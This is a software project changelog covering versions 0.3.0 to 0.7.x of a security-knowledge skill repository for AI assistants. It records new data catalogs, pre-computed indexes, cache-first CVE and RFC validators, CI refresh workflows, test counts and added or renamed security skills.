### validate-cves / validate-rfcs — cache-first

- Both now accept **`--from-cache [<dir>]`**. When set, the orchestrator opportunistically reads NVD/KEV/EPSS (CVEs) or Datatracker (RFCs) records from the prefetch cache and falls through to live network on per-entry cache misses. Reports `cache hits` / `live fallbacks` at the end of the run. Logs the cache directory in the mode banner.
- `validateAllCvesPreferCache(catalog, cacheDir)` is the new orchestrator-internal helper; it produces the same shape `validateAllCves` does so existing print-and-fail logic doesn't fork.

### build-indexes — incremental + parallel + selective

- Refactored to a declarative outputs registry. Each output declares its source-file dependencies (`deps`) + any produced-output prerequisites (`dependsOn`, e.g. `token-budget` needs `section-offsets` on disk first).
- **`--only <names>`** — rebuild specific outputs (and their dependency closure).
- **`--changed`** — rebuild only outputs whose declared deps changed since the last `_meta.json` snapshot. CI-safe: identical inputs produce identical outputs. Allowed in CI per project decision.
- **`--parallel`** — run independent outputs concurrently via `Promise.all()`. Same byte-identical output as sequential mode (verified by `tests/build-incremental.test.js`).
- No-op short-circuit when `--changed` finds zero changed sources: `_meta.json` is re-written with the current hashes so the freshness gate stays correct.

### CI workflow updates

- **`.github/workflows/refresh.yml`** — adds a `Warm upstream cache` step before the dry-run that uses `npm run prefetch`. The subsequent refresh runs use `--from-cache .cache/upstream --swarm` for parallel apply against cached data. Eliminates parallel-fetch rate-limit contention.
- **`.github/workflows/ci.yml`** — data-integrity job picks up the new `validate-indexes` and `validate-vendor` gates (previously only enforced via predeploy).

### Predeploy

12 gates now (was 11). New: **Vendor tree integrity** (`validate-vendor`). 12/12 green on this release.

### npm scripts

- `prefetch`, `prefetch:dry`
- `refresh:from-cache`, `refresh:swarm`
- `validate-vendor`

### Tests

- **`tests/job-queue.test.js`** — concurrency cap, priority order, transient-retry via vendored classifier, no retry on 4xx, drain, queue_meta propagation. 7 tests.
- **`tests/worker-pool.test.js`** — single dispatch, parallelism wall-clock check, worker-reported error, scriptPath validation. 5 tests.
- **`tests/prefetch.test.js`** — dry-run produces empty cache, source filter, `SOURCES` shape, `readCached` freshness + `allowStale`, unknown source rejection. 5 tests.
- **`tests/build-incremental.test.js`** — `--only` dependency closure (`token-budget` pulls in `section-offsets`), unknown name rejection, `--changed` no-op when sources unchanged, `--changed` picks up a touched skill body, `--parallel` produces byte-identical output, `OUTPUTS` registry parity. 6 tests.
- **`tests/refresh-swarm.test.js`** — swarm vs. sequential report parity, `--from-cache` reads cache layout, `--from-cache <nonexistent>` exits non-zero. 3 tests.

Total: 182/182 pass (was 156).

### SBOM

`sbom.cdx.json` `components` array now lists the vendored files as proper CycloneDX library components with SHA-256 hashes, source repo, pinned commit, and an `externalReferences` link back to upstream. Metadata properties add `exceptd:vendor:count` and `exceptd:vendor:pin`.

## 0.7.0 — 2026-05-11

**Minor: tier-2/3/4 derived indexes + external-data refresh automation.** Builds on v0.6.0's six-index baseline with eleven more pre-computed indexes for AI-consumer ergonomics, plus a scheduled GitHub Actions job that pulls upstream KEV/EPSS/NVD/RFC data and either upserts catalogs or opens issues for version-pin bumps.

### New indexes (eleven, under `data/_indexes/`)

| File | Purpose |
|---|---|
| `summary-cards.json` | Per-skill 100-word abstract: description, Threat Context excerpt, what it produces, key cross-refs, handoff targets. Saves the `researcher` skill from parsing each routed skill's body to summarize. |
| `section-offsets.json` | Per-skill byte/line offsets of every H2 section. Consumers slice a single section (e.g. "Compliance Theater Check") from disk instead of reading the whole body. Fence-aware — code-block `## Foo` lines are not counted. |
| `chains.json` (extended) | Pre-computed cross-walks now keyed by both CVE-id and CWE-id. CWE chains hydrate skills citing the CWE, plus related CVEs reached through the skill graph. |
| `token-budget.json` | Approximate token cost per skill + per section. Lets AI consumers budget context cost before loading. |
| `recipes.json` | 8 curated multi-skill recipes for common ops use cases: AI red team prep, PCI 4.0 audit defense, federal IR, DORA TLPT scoping, K-12 EdTech privacy review, ransomware tabletop, new-CVE triage, OSS dep triage. |
| `jurisdiction-clocks.json` | Normalized jurisdiction × obligation × hours matrix (breach notification, patch SLA). 29 jurisdictions, derived from `data/global-frameworks.json`. |
| `did-ladders.json` | Canonical defense-in-depth ladders per attack class (prompt injection, kernel LPE, AI-C2, ransomware, supply chain, BOLA, model exfiltration, BEC). Each layer references the source skill + D3FEND id backing it. |
| `theater-fingerprints.json` | Structured records for the 7 compliance-theater patterns: claim, audit evidence, reality, fast detection test, controls implicated, evidence CVE / campaign. Inverted by control id. |
| `currency.json` | Pre-computed skill currency snapshot against `manifest.threat_review_date` (deterministic). Saves the watchlist/scheduler from re-running `orchestrator currency`. |
| `frequency.json` | Citation-count tables per catalog field (CWE / ATLAS / ATT&CK / D3FEND / framework_gap / RFC / DLP). Surfaces load-bearing entries and orphan-adjacent ones. |
| `activity-feed.json` | "What changed when" feed across skills + catalogs, sorted descending. Lightweight RSS. |
| `catalog-summaries.json` | Compact per-catalog summary cards: purpose, schema version, last-updated, TLP, source confidence, entry count. |
| `stale-content.json` | Persisted snapshot of audit-cross-skill stale-content findings (renamed-skill tokens, README badge drift, researcher count claim, stale skill reviews, stale catalog freshness). Deterministic against `manifest.threat_review_date`. |

### Builder restructure

`scripts/build-indexes.js` now orchestrates `scripts/builders/*.js` — one module per index. The main script keeps the v0.6.0 outputs inline and delegates new outputs. All builders are zero-dep Node 24 stdlib.

`_meta.json` now records source SHA-256 hashes for 49 files (manifest + 10 catalogs + 38 skills) and stamps every new index with stats.

### External-data refresh automation

- **`lib/refresh-external.js`** — new orchestrator. Five source modules: KEV (CISA), EPSS (FIRST.org), NVD (CVSS metrics), RFC (IETF Datatracker), and PINS (MITRE ATLAS / ATT&CK / D3FEND / CWE upstream releases). Each module returns a diff list; `--apply` writes upserts back to the local catalog, bumps `last_verified`, then rebuilds indexes. PINS is intentionally **report-only** per AGENTS.md Hard Rule #12 — version-pin bumps require audit, surfaced as a GitHub issue instead of an auto-PR.
- **`sources/validators/version-pin-validator.js`** — checks ATLAS, ATT&CK, D3FEND, and CWE GitHub releases against the local pin.
- **`.github/workflows/refresh.yml`** — daily 06:00 UTC dry-run + apply; weekly 06:30 UTC version-pin slot. On diffs, opens an auto-PR (`data-refresh/auto` branch, labels `data-refresh` + `automation`). On pin drift, opens an issue (labels `version-pin` + `automation` + `minor-update`). Uses `NVD_API_KEY` secret if available.
- **`tests/fixtures/refresh/`** — frozen fixture payloads (kev / epss / nvd / rfc / pins .json) so the test suite exercises the orchestrator deterministically with no network.
- **`tests/refresh-external.test.js`** — 8 tests covering dry-run, `--source` filter, `--help`, fixture-mode determinism, fixture/source-module parity.

### `npm run` additions

- `refresh` / `refresh:dry` — dry-run all sources, write `refresh-report.json`
- `refresh:apply` — apply diffs + rebuild indexes
- `refresh:offline` — fixture-mode run, never touches network

`refresh-report.json` is gitignored — CI uploads it as an artifact.

### Test coverage

- `tests/indexes-v070.test.js` — 16 new tests across the 13 new/extended index files. Covers shape, cross-references to real skills + catalogs, byte-stability across rebuilds (idempotence).
- 156 tests pass (was 132); 11/11 predeploy gates green.

### Internal fixes during this release

- `scripts/builders/section-offsets.js` skips code-fenced `## ` lines so output-template H2s (e.g. inside `### Output Format` code blocks) don't get mistaken for real section boundaries.
- `scripts/builders/summary-cards.js` extractor skips leading H3 / metadata / table-separator lines before grabbing the first prose paragraph for `threat_context_excerpt`.
- `scripts/builders/theater-fingerprints.js` properly skips the `### Pattern N:` header line before scanning for the next H2 boundary (otherwise the section block collapsed to a single char).

## 0.6.0 — 2026-05-11

**Minor: derived-data indexes layer for AI-consumer token efficiency.** Real bottleneck for skill use is token cost (AI consumers loading 1.6 MB of catalogs + skill bodies to answer one cross-reference question), not parse speed (every operation was already sub-5ms). This release adds a pre-computed derived-data layer at `data/_indexes/`.

### New `data/_indexes/` directory

Six derived index files. Never hand-edited; regenerated by `npm run build-indexes` after any source change. A `_meta.json` records SHA-256 of every source file so the new predeploy gate detects staleness automatically.

- **`xref.json`** — inverted index over 161 catalog entries across 7 fields (cwe_refs, d3fend_refs, framework_gaps, atlas_refs, attack_refs, rfc_refs, dlp_refs). Answers "which skills cite CWE-79?" in O(1) instead of a 38-skill linear scan.
- **`trigger-table.json`** — 453 unique trigger strings → list of skills. Replaces the dispatcher's linear scan with a hash lookup.
- **`chains.json`** — 5 pre-computed CVE chains (per CVE: referencing skills + hydrated CWE / ATLAS / D3FEND / framework_gaps entries). Single-file answer to "what does the project know about CVE-2026-31431?".
- **`jurisdiction-map.json`** — 34 jurisdictions → skills mentioning them in body. Built from both jurisdiction codes and regulator-name patterns (GDPR → EU, NCSC → UK, MAS → SG, etc.).
- **`handoff-dag.json`** — 38 nodes, 285 edges. Pre-computed cross-skill mention graph with in-degree / out-degree per node.
- **`_meta.json`** — SHA-256 source hash table for staleness detection; predeploy gate consumes this.

Total index size: ~125 KB across 6 files — **93% reduction** vs loading all skills + catalogs (1.66 MB) for cross-reference queries.

### New tooling

- `scripts/build-indexes.js` — regenerates all 6 indexes from canonical sources. Idempotent. Zero new npm deps.
- `lib/validate-indexes.js` — predeploy gate. Re-hashes every source file and compares to `_meta.json`. Fails the build if indexes are stale (developer must `npm run build-indexes`).
- `scripts/audit-perf.js` — micro-benchmarks hot paths (manifest load, catalog load, skill body read, frontmatter parse, trigger match, xref lookup, multi-hop chain, watchlist aggregator). Confirms baseline numbers + measures index speedups.
- `npm run` scripts added: `build-indexes`, `validate-indexes`, `audit-perf`, `audit-cross-skill`.

### Predeploy gate count

10 → 11 gates. New gate: **Pre-computed indexes freshness**. Sits in `data-integrity` CI job.

### Speed measurements

| Operation | Before | After (index) | Speedup |
|---|---|---|---|
| "Which skills cite CWE-79?" | 0.037 ms | 0.011 ms | 3.4× |
| Full CVE chain reconstruction | 0.569 ms | 0.009 ms | 63× |
| Token cost for cross-ref query | ~450K tokens | ~30K tokens | 93% reduction |

### Verification

- 11/11 predeploy gates green
- 38/38 skills signed
- audit-cross-skill: 0 issues
- audit-perf: all hot paths sub-5ms; indexes 60+× faster than on-the-fly chain reconstruction

## 0.5.5 — 2026-05-11

Pin: cross-skill audit fixes. Added `scripts/audit-cross-skill.js` (comprehensive accuracy checker) and ran it against the v0.5.4 state.

### Bugs found and fixed

| # | Bug | Fix |
|---|---|---|
| 1 | `mcp-agent-trust` skill cited `RFC-8446` in catalog's `skills_referencing` but missing from skill's own `rfc_refs` (asymmetric reference) | Restored `RFC-8446` to skill's frontmatter + manifest entry |
| 2 | README badge `skills-25-` 13 stale | Bumped to `skills-38-` |
| 3 | README badge `jurisdictions-33-` 1 stale | Bumped to `jurisdictions-34-` |
| 4 | `researcher` skill body claimed "36 specialized skills downstream"; actual is 37 | Updated to 37 in both occurrences |

### New tooling

- `scripts/audit-cross-skill.js` — runs 15 cross-skill accuracy checks: manifest path existence, frontmatter ↔ manifest name parity, researcher-dispatch coverage, AGENTS.md Quick-Ref coverage, version triple agreement, snapshot drift, SBOM drift, every-catalog-ref-resolves, RFC reverse-ref symmetry, skill-update-loop affected-skills validity, stale renamed-skill tokens, trigger collisions, README badge drift, researcher count claim. Exit non-zero on any finding.
- Trigger collisions (13 informational) — all intentional fan-out per researcher dispatch policy (promptsteal/promptflux, compliance gap, mas trm, apra cps 234, defense in depth, tlpt, tiber-eu, csaf, blue team, workload identity, nerc cip, falco).

### Verification

- `node scripts/audit-cross-skill.js` → 0 issues
- 10/10 predeploy gates green
- 38/38 skills signed

## 0.5.4 — 2026-05-11

Pin-level rename + terminology cleanup. The `age-gates-minor-safeguarding` skill shipped in 0.5.3 has been renamed to `age-gates-child-safety`. Prose use of "minor" replaced with "child" / "children" / specific cohort terms ("under-13", "under-16", "under-18") throughout the skill body. Direct regulatory citations that use the word (CN Minors Protection Law, DSA Art. 28 wording, AVMSD "minor protection" terminology, Character.ai case reference) preserved verbatim.

### Public-surface change

This is a renamed skill (removed `age-gates-minor-safeguarding` + added `age-gates-child-safety`). The snapshot gate handled the additive rename via `npm run refresh-snapshot`. Downstream consumers pinned to the previous name should update their reference; the published name had only been on `main` for ~one commit.

### Files touched

- Directory rename: `skills/age-gates-minor-safeguarding/` → `skills/age-gates-child-safety/`
- Skill frontmatter: `name`, `description`, `triggers`
- Skill body: prose "minor" → "child" where context allowed (~71 of 86 occurrences); 15 remaining are regulatory citations preserved verbatim
- `manifest.json`: renamed entry + updated path + triggers
- `manifest-snapshot.json`: regenerated
- `AGENTS.md`: Quick Skill Reference row updated
- `skills/researcher/skill.md`: dispatch routing entry added (the rename surfaced that this skill was never wired into researcher dispatch in 0.5.3 — corrected here)
- `CHANGELOG.md`: 0.5.3 entry retroactively updated to use the new name
- SBOM refreshed

### Verification

- 10/10 predeploy gates green
- 38/38 skills signed and lint-passing

## 0.5.3 — 2026-05-11

Pin-level skill additions closing thematic and age-related coverage gaps. Total skills 31 → 38.

### New skills (7)

**Thematic (6)**:
- **`api-security`** — OWASP API Top 10 2023, AI-API specific (rate limits, prompt-shape egress, MCP HTTP transport), GraphQL + gRPC + REST + WebSocket attack surfaces, API gateway posture, BOLA/BFLA/SSRF/Mass Assignment.
- **`cloud-security`** — CSPM/CWPP/CNAPP, CSA CCM v4, AWS/Azure/GCP shared responsibility, cloud workload identity federation (IRSA, Azure Workload Identity, GCP Workload Identity, SPIFFE/SPIRE), eBPF runtime detection (Falco, Tetragon).
- **`container-runtime-security`** — CIS K8s Benchmark v1.10, NSA/CISA Hardening Guide, Pod Security Standards (Privileged/Baseline/Restricted), Kyverno/OPA Gatekeeper admission, Sigstore policy-controller, AI inference workloads (KServe, vLLM, Triton).
- **`mlops-security`** — Training data integrity, model registry signing, deployment pipeline provenance, inference serving hardening, drift detection, feedback loop integrity. MLflow / Kubeflow / Vertex AI / SageMaker / Azure ML / Hugging Face. NIST 800-218 SSDF + SLSA L3 + ISO 42001.
- **`incident-response-playbook`** — NIST 800-61r3 (2025), ISO/IEC 27035-1/-2:2023, ATT&CK-driven detection, PICERL phases, AI-class incident handling (prompt injection breach, model exfiltration, AI-API C2). Cross-jurisdiction notification clocks (DORA 4h, NIS2 24h, GDPR 72h, NYDFS 72h + 24h ransom, CERT-In 6h, LGPD/PIPL/AE).
- **`email-security-anti-phishing`** — SPF/DKIM/DMARC/BIMI/ARC/MTA-STS/TLSRPT email auth, AI-augmented phishing (voice cloning, deepfake video, hyperpersonalized email), Business Email Compromise, secure email gateways, FIDO2/WebAuthn passkey deployment.

**Age-related (1)** — flagged as audit gap during this cycle:
- **`age-gates-child-safety`** — Age verification + child online safety across ~25 jurisdictions: US COPPA + CIPA + California AADC + NY SAFE for Kids + adult-site age-verification state laws (TX/MS/UT/16+ states); EU GDPR Art. 8 + DSA Art. 28 + AVMSD + CSAM Regulation pending; UK Online Safety Act 2023 (Ofcom enforcement July 2025) + Children's Code; AU Online Safety Act + under-16 social media ban; IN DPDPA child provisions; BR LGPD Art. 14; CN Minors Protection Law (regulation name preserved verbatim); SG Online Safety Act; KOSA pending US federal. Age-verification standards (IEEE 2089-2021, OpenID Connect age claims). AI product age policies. CSAM detection (NCMEC).

### Cross-skill integration

- `researcher` dispatch table extended with 7 new routing entries; count bumped to "37 specialized skills downstream + researcher".
- `skill-update-loop`: 7 new skills wired into Triggers 1/3/4/5/9 where appropriate. New **Trigger 12 (Vendor Security Tool Capability Shift)** for CSPM/CWPP/EDR/SEG/MLOps platform vendor-category capability changes.
- 14 new RFC reverse-references in `data/rfc-references.json`.
- `AGENTS.md` Quick Skill Reference table extended with 7 new rows.

### Verification

- 10/10 predeploy gates passing
- 38/38 skills passing lint
- 132/132 tests passing
- SBOM refreshed to reflect 38 skills + 10 catalogs

## 0.5.2 — 2026-05-11

Pin-level skill additions closing the sector and thematic coverage gaps the cross-skill audit flagged. Six new skills written by parallel agents; total skills 25 → 31.

### New skills

- **`webapp-security`** — OWASP Top 10 2025, OWASP ASVS v5, CWE root-cause coverage (CWE-22/79/89/77/78/94/200/269/287/352/434/502/732/862/863/918/1188), AI-generated code weakness drift, server-rendered vs SPA tradeoffs.
- **`ai-risk-management`** — ISO/IEC 23894 risk process, ISO/IEC 42001 management system, NIST AI RMF, EU AI Act high-risk obligations (binding 2026-08-02), AI impact assessments, AI red-team programs, AI incident lifecycle.
- **`sector-healthcare`** — HIPAA + HITRUST + HL7 FHIR security, medical device cyber (FDA 524B + EU MDR), AI-in-healthcare under EU AI Act + FDA AI/ML SaMD, PHI in LLM clinical tools.
- **`sector-financial`** — EU DORA TLPT, PSD2 RTS-SCA, SWIFT CSCF v2026, NYDFS 23 NYCRR 500 Second Amendment, FFIEC CAT, MAS TRM, APRA CPS 234, IL BoI Directive 361, OSFI B-13; threat-led pen testing schemes TIBER-EU + CBEST + iCAST.
- **`sector-federal-government`** — FedRAMP Rev5, CMMC 2.0, EO 14028, NIST 800-171/172 CUI, FISMA, M-22-09 federal Zero Trust, OMB M-24-04 AI risk, CISA BOD/ED; cross-jurisdiction NCSC UK + ENISA EUCC + AU PSPF + IL government cyber methodology.
- **`sector-energy`** — Electric power + oil & gas + water/wastewater + renewable-integration cyber. NERC CIP v6/v7, NIST 800-82r3, TSA Pipeline SD-2021-02C, AWWA, EU NIS2 energy + NCCS-G (cross-border electricity), AU AESCSF + SOCI, ENISA energy sector.

### Cross-skill integration

- `researcher` dispatch table extended with 6 new routing entries; count bumped to "30 specialized skills downstream of the researcher (31st)".
- `skill-update-loop`: 6 new skills wired into Triggers 1/3/4/5/9/10 where appropriate. New **Trigger 11 (Sector regulatory cycle)** for healthcare/financial/federal/energy regulatory updates.
- 12 new RFC reverse-references in `data/rfc-references.json` (RFC-7519 / RFC-8725 / RFC-8446 / RFC-9114 / RFC-9421 / RFC-8032 added skills_referencing entries).
- `AGENTS.md` Quick Skill Reference table extended with 6 new trigger-routing rows.

### Verification

- 10/10 predeploy gates passing
- 31/31 skills passing lint
- 132/132 tests passing
- SBOM refreshed to reflect 31 skills + 10 catalogs

## 0.5.1 — 2026-05-11

Pin-level audit cleanup. Closes the final orphans surfaced by the cross-skill audit.

### Orphan closures via citation backfill

- **10 CWE orphans → 0** through citations in existing skills:
  - CWE-22 / CWE-77 / CWE-352 / CWE-434 / CWE-918 cited in `mcp-agent-trust` (MCP HTTP transport weakness classes) and `attack-surface-pentest` (pen-test scope).
  - CWE-269 / CWE-732 cited in `identity-assurance` (privilege management) and `attack-surface-pentest`.
  - CWE-125 / CWE-362 cited in `kernel-lpe-triage` (memory + concurrency kernel classes) and `fuzz-testing-strategy`.
  - CWE-1188 cited in `policy-exception-gen` and `security-maturity-tiers` (insecure-defaults posture).
- **1 framework_gap orphan → 0**: `ISO-IEC-23894-2023-clause-7` cited in `ai-attack-surface` and `threat-modeling-methodology`.

### Cumulative orphan state across all catalogs

| Catalog | Orphans | Total entries |
|---|---|---|
| `data/atlas-ttps.json` | 0 | (full) |
| `data/cve-catalog.json` | 0 | 5 |
| `data/cwe-catalog.json` | 0 | 34 |
| `data/d3fend-catalog.json` | 0 | 21 |
| `data/rfc-references.json` | 0 | 19 |
| `data/framework-control-gaps.json` | 0 | 49 |

Every entry across every catalog is now referenced by ≥1 skill.

### Verification

- 10/10 predeploy gates green (Ed25519 / tests / catalog / offline-CVE / offline-RFC / snapshot / lint / watchlist / catalog-meta / SBOM-currency)
- 132/132 tests passing
- All 25 skills re-signed; manifest snapshot regenerated additively

## 0.5.0 — 2026-05-11

**Cross-skill cohesion + foundational expansion completion.** Closes the orphan framework gaps the cross-skill audit identified, expands jurisdiction coverage, completes the hand-off DAG between skills.

### Four new skills (21 → 25)

Each closes a previously orphaned framework_gap and ships with the full 7-required-section contract plus the optional 8th Defensive Countermeasure Mapping plus a `## Hand-Off / Related Skills` section.

- **`identity-assurance`** — Closes the `NIST-800-63B-rev4` orphan. NIST 800-63 AAL/IAL/FAL, FIDO2/WebAuthn passkeys, OIDC/SAML/SCIM federation, agent-as-principal identity, short-lived workload tokens, OAuth 2.0 + RFC 9700 BCP. References RFC 7519/8725/6749/9700/8032.
- **`ot-ics-security`** — Closes the `NIST-800-82r3`, `IEC-62443-3-3`, `NERC-CIP-007-6-R4` orphans. NIST 800-82r3, IEC 62443-3-3, NERC CIP, IT/OT convergence, AI-augmented HMI threats, ATT&CK for ICS (T0855, T0883).
- **`coordinated-vuln-disclosure`** — Process skill: ISO 29147 (disclosure) + ISO 30111 (handling), VDP, bug bounty, CSAF 2.0 advisories, security.txt (RFC 9116), EU CRA Art. 11 / NIS2 Art. 12 regulator-mandated disclosure, AI vulnerability classes.
- **`threat-modeling-methodology`** — Methodology skill: STRIDE, PASTA, LINDDUN (privacy), Cyber Kill Chain, Diamond Model, MITRE Unified Kill Chain v3, AI-system threat modeling, agent-based threat modeling.

### Cross-skill graph fixes

- **DAG hand-off backfill**: 5 v0.4.0 skills had IN-DEGREE 0 (no skill mentioned them — including the dispatcher); 4 v0.3.0 skills had OUT-DEGREE 0 (leaf with no hand-off). Both fixed. `researcher` dispatch table now routes to all 24 specialized skills with explicit disambiguation policy for 4 trigger collisions (`promptsteal`/`promptflux` fan-out, `compliance gap`, `defense in depth`, `zero trust`). Four former-leaf skills (`kernel-lpe-triage`, `mcp-agent-trust`, `rag-pipeline-security`, `ai-c2-detection`) gained `## Hand-Off / Related Skills` sections.
- **CWE/D3FEND cross-reference backfill**: 16 of 21 skills carried zero `cwe_refs` and 19 of 21 carried zero `d3fend_refs` in manifest entries pre-v0.5.0. Comprehensive backfill applied — D3FEND orphans dropped from 20/20 to 0/20 (every defensive technique now cited by ≥1 skill).
- **Frontmatter dedup pass** — fixed double-`d3fend_refs` blocks introduced by the bulk sync in 3 skills.

### Jurisdiction expansion (22 → 33)

`data/global-frameworks.json` grew from 22 to 33 entries (v1.2.0 → v1.3.0). New nation-state jurisdictions: NO (Norway), MX (Mexico), AR (Argentina), TR (Turkey), TH (Thailand), PH (Philippines). New US sub-national: US_CALIFORNIA (CCPA + CPRA + CPPA + AI Transparency Act). New EU sub-regulators (split out from monolithic EU block): EU_DE_BSI (Germany IT-Grundschutz + TR-02102 crypto), EU_FR_ANSSI (RGS + PASSI + LPM), EU_ES_AEPD (most active GDPR enforcer + AESIA AI agency), EU_IT_AgID_ACN (Italian Perimetro), EU_ENISA (EUCC/EUCS-Cloud certification schemes).

### Update-loop integration

`skill-update-loop` got 4 new skills wired into Triggers 4, 5, and 9. New **Trigger 10: Threat Modeling Methodology Updates** added for STRIDE/LINDDUN/Unified Kill Chain revisions.

### Governance doc refresh

`README.md`, `CONTEXT.md`, `ARCHITECTURE.md`, `MAINTAINERS.md`, `AGENTS.md` Quick Skill Reference table all updated to reflect 25 skills, 10 data catalogs, 33 jurisdictions.

### Verification

- 25/25 skills passing lint
- 132/132 tests passing
- 7/7 predeploy gates passing
- DAG: 0 skills with in-degree 0, 0 skills with out-degree 0
- Orphans: 0 ATLAS, 0 D3FEND, 0 RFC, 0 CVE, 16/34 CWE (unallocated weakness classes — documented gap), 13/49 framework_gaps reduced via the 4 new skills to 9/49 (remaining 9 are sectoral gaps requiring future sector skills)

## 0.4.0 — 2026-05-11

**Foundational expansion pass.** Catches the gaps a deeper-research audit surfaced: CWE / D3FEND / EPSS / DLP / supply-chain / pen-testing / fuzz / ISO 42001 / additional jurisdictions / vendor advisories.

### New data catalogs
- **`data/cwe-catalog.json`** — 30 CWE entries pinned to CWE v4.17. Covers 19 of CWE Top 25 (2024) plus AI/ML / supply-chain entries (CWE-1395, CWE-1426, CWE-1357, CWE-494, CWE-829). Each entry cross-walks to evidence_cves, capec, framework controls, and skills_referencing.
- **`data/d3fend-catalog.json`** — 21 MITRE D3FEND defensive techniques pinned to D3FEND v1.0.0. Counter-mapped to ATT&CK and ATLAS techniques. Each entry carries `ai_pipeline_applicability` per AGENTS.md hard rule #9.
- **`data/dlp-controls.json`** — 21 DLP control entries spanning channel (LLM-prompt, MCP-tool-arg, clipboard-AI, code-completion, IDE-telemetry), classification (regex, ML, embedding-match, watermark), surface (RAG corpus, embedding store, training data), enforcement (block/redact/coach), and evidence (audit, forensics).

### Catalog augmentation
- **`data/cve-catalog.json`** — Every CVE entry gets `epss_score`, `epss_percentile`, `epss_date`, `epss_source` fields. `_meta.epss_methodology` explicitly documents that scores are estimates derived from public catalog signals (KEV, PoC, AI-discovery, blast radius) pending live FIRST API replacement on the next `validate-cves --live` run.
- **`data/framework-control-gaps.json`** — 26 new entries: ISO/IEC 42001:2023, ISO/IEC 23894, OWASP LLM Top 10 (LLM01/02/06/08), OWASP ASVS v5.0, NIST 800-218 SSDF, NIST 800-82r3, NIST 800-63B rev4, IEC 62443-3-3, FedRAMP Rev5, CMMC 2.0, HIPAA Security Rule, HITRUST CSF v11.4, NERC CIP-007-6, PSD2 RTS-SCA, SWIFT CSCF v2026, SLSA Build L3, VEX/CSAF v2.1, CycloneDX 1.6, SPDX 3.0, OWASP Pen Testing Guide v5, PTES, NIST 800-115, CWE Top 25 meta-control. Catalog grew from 23 to 49 entries.
- **`data/global-frameworks.json`** — 8 new jurisdictions: BR (LGPD), CN (PIPL+DSL+CSL), ZA (POPIA), AE (UAE PDPL), SA (KSA PDPL), NZ (Privacy Act 2020), KR (PIPA), CL (Law 19.628 + 2024 amendments). `IN` block enriched with DPDPA alongside the existing CERT-In entry; `CA` enriched with Quebec Law 25 and PIPEDA. `_notification_summary` rolled up across 21 jurisdictions.
- **`sources/index.json`** — 15 new primary sources registered: EPSS API, OSV.dev (promoted), CSAF 2.0, STIX/TAXII (export target), MISP, VulnCheck KEV, CWE, CAPEC, MITRE ATT&CK (pinned v17 / 2025-06-25), D3FEND, SSVC, SLSA, Sigstore, plus a `vendor_advisories` block listing MSRC, RHSA, USN, Apple, Cisco, Oracle, SUSE, Debian DSA, Google ASB.

### Version pinning (AGENTS.md hard rule #12)
- **MITRE ATT&CK v17** (2025-06-25) now pinned at `manifest.json` top level alongside ATLAS v5.1.0. Manifest snapshot tracks both.
- **CWE v4.17, CAPEC v3.9, D3FEND v1.0.0** pinned in `sources/index.json`.

### Frontmatter spec extension
- New optional skill frontmatter fields: `cwe_refs`, `d3fend_refs`, `dlp_refs`. Each validates against the corresponding catalog. Schema in `lib/schemas/skill-frontmatter.schema.json`. Manifest snapshot now diffs these fields.
- New optional 8th body section: `## Defensive Countermeasure Mapping`. Required for skills shipped on or after 2026-05-11; pre-existing skills are exempt until their next minor version bump.
- `## Analysis Procedure` must now explicitly thread **defense in depth, least privilege, and zero trust** as foundational design dimensions (not optional considerations).

### Five new skills (16 → 21)
- **`attack-surface-pentest`** — Modern attack surface management + pen testing methodology. NIST 800-115, OWASP WSTG v5, PTES, ATT&CK-driven adversary emulation, TIBER-EU. AI-surface (APIs, MCP, RAG, embedding stores) included in scope.
- **`fuzz-testing-strategy`** — Continuous fuzzing as security control. AFL++, libFuzzer, syzkaller, RESTler, garak, AI-augmented fuzz (OSS-Fuzz pipelines, Microsoft AIM). NIST 800-218 SSDF gap.
- **`dlp-gap-analysis`** — DLP gaps for mid-2026: legacy DLP misses LLM prompts, MCP tool args, RAG retrievals, embedding-store exfiltration, code-completion telemetry. Layered defense across SDK logging / proxy inspection / endpoint DLP / egress NTA.
- **`supply-chain-integrity`** — SLSA Build L3+, in-toto attestations, Sigstore signing, SBOM (CycloneDX 1.6 / SPDX 3.0), VEX via CSAF 2.0, AI-generated code provenance, model weights as supply-chain artifacts.
- **`defensive-countermeasure-mapping`** — Meta-skill mapping offensive findings (CVE / TTP / framework gap) to MITRE D3FEND defensive techniques with explicit defense-in-depth layer, least-privilege scope, zero-trust posture, AI-pipeline applicability.

### Linter + snapshot gate updates
- `lib/lint-skills.js` validates `cwe_refs` against `data/cwe-catalog.json`, `d3fend_refs` against `data/d3fend-catalog.json`, `dlp_refs` against `data/dlp-controls.json`.
- `scripts/check-manifest-snapshot.js` and `scripts/refresh-manifest-snapshot.js` include the three new ref fields in the public-surface diff.
- AGENTS.md skill format spec + Quick Skill Reference table updated for the 5 new skills.

### Verification
- 21/21 skills passing lint
- 132/132 tests passing
- 7/7 predeploy gates passing

## 0.3.0 — 2026-05-11

Pre-release: every CI gate green, full skill corpus compliant with the AGENTS.md hard rules.

### Vendor-neutrality refactor
- **Renamed `AGENT.md` → `AGENTS.md`** to align with the cross-vendor convention (OpenAI Codex CLI, Sourcegraph amp, Aider, Continue, Cline, Roo Code, Q Developer all auto-load `AGENTS.md`). `AGENTS.md` is the canonical agent-agnostic source for all internal citations and the **only** project-rules file shipped in the repo.
- **Removed `CLAUDE.md` entirely.** No per-vendor mirror is shipped. The earlier plan to maintain a byte-identical Claude Code mirror was dropped after recognizing that a globally-gitignored filename would never reach downstream consumers anyway. Claude Code users load `AGENTS.md` manually (`@AGENTS.md`) or via a per-machine `~/.claude/CLAUDE.md` they configure themselves.
- **Added `.windsurfrules`** as a pointer stub for Windsurf's auto-load convention.
- **Bulk replaced all internal citations** (~20 files: `.github/workflows/*`, `.github/ISSUE_TEMPLATE/*`, schemas, library code, scripts, skill bodies) so the project no longer privileges one vendor's filename when citing its own rules.
- **`README.md` AI Assistant Configuration table** now lists every major coding assistant — OpenAI Codex CLI, Anthropic Claude Code, Cursor, GitHub Copilot, Windsurf, Sourcegraph amp, Aider, Continue, Cline, Roo Code, Q Developer, Google Gemini CLI, JetBrains AI, Replit Agent — with explicit instructions for how each one picks up `AGENTS.md`.

### Skills (16th added)
- `researcher` — Top-level triage entry-point that classifies raw threat intel inputs (CVE ID, ATLAS TTP, framework control, incident narrative), researches them across every `data/*.json` catalog, applies RWEP scoring, and routes to the right downstream specialized skill with an EU/UK/AU/ISO global-jurisdiction surface. Closes the orchestration gap between operator and the 15 specialist skills.

### Pre-ship gate compliance
- Every CI gate now passes locally and in-workflow: `npm run predeploy` reports 6/6 green (Ed25519 signature verification, cross-OS tests, CVE catalog + zero-day learning loop validation, offline CVE state, manifest snapshot gate, skill lint).
